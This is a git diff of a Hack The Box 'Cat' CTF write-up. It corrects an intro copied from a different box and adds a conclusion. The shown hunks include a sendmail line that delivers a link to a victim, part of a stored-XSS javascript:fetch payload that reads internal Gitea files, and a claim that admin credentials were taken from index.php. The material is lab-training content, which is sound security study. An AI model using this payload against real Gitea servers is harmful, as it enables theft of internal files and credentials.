@@ -1,5 +1,5 @@
 #  HackTheBox: Cat - Writeup
-This medium-difficulty box involves discovering a vulnerable Grafana v11.0.0 subdomain and exploiting CVE-2024-9264 for initial access. After pivoting to the user enzo, an internal cronjob web app running as root is accessed via SSH tunneling. Abusing this app allows privilege escalation to root. The box combines web enumeration, real-world CVE usage, and creative privesc via scheduled tasks.
+Cat is a Medium-difficulty machine on Hack The Box that blends web exploitation with real-world misconfigurations and insecure development practices. The machine begins with standard enumeration, leading to the discovery of an exposed .git directory containing source code for a custom web application. Through careful analysis, multiple vulnerabilities are identified including stored XSS, SQL injection, and poor session handling. The challenge also involves tunneling to access internal services, where a vulnerable Gitea instance (CVE-2024-6886, a persistent XSS flaw) is exploited to extract sensitive internal files. Overall, the box offers a solid progression path that tests enumeration, web exploitation, and lateral movement skills.
 
 ##  Enumeration
 
@@ -145,7 +145,7 @@ We are able to login into the gitea, using axel’s credentials.
 
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image049.png)
 
-We see this web server is powered by gitea version 1.22.0. Which is, vulnerable to Persistent XSS.
+We see this web server is powered by gitea version 1.22.0. Which is, vulnerable to Persistent XSS (CVE-2024-6886).
 
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image051.png)
 
@@ -173,11 +173,11 @@ echo "http://localhost:3000/axel/test/" | sendmail jobert@localhost
  
 The obtained data is then decoded from base64, getting the following information;
 
-```
+`
 Employee Management
 Site under construction. Authorized user: admin. No visibility or updates visible to employees.
 In order to get the contents of the git, the following script is formed.
-```
+`
 ``` bash
 <a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/')
   .then(r => r.text())
@@ -197,16 +197,23 @@ After decoding the received data, the following paths are found;
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image059.png)
  
 There are the interesting paths, containing files;
+
+```
 /administrator/Employee-management/src/branch/main/chart.min.js
 /administrator/Employee-management/src/branch/main/dashboard.php
 /administrator/Employee-management/src/branch/main/index.php
 /administrator/Employee-management/src/branch/main/logout.php
 /administrator/Employee-management/src/branch/main/README.md
 /administrator/Employee-management/src/branch/main/style.css
+```
 
 Upon finding those paths, I used the XSS script to get back data from those paths, and from index.php I obtained the admin credentials, getting the root flag.
  
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image062.jpg)
 
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image064.jpg)
+
+# Conclusion
+
+The Cat machine demonstrates a realistic multi-step exploitation process, beginning with identifying exposed services and extracting a .git directory to gain source code access. From there, a combination of XSS and SQL injection vulnerabilities was used to hijack the admin session and extract sensitive data. This led to credential reuse and lateral movement via SSH, ultimately revealing additional services through log analysis and tunneling. By exploiting a persistent XSS vulnerability in Gitea, sensitive internal project files were accessed, allowing for privilege escalation and recovery of the root flag.
 
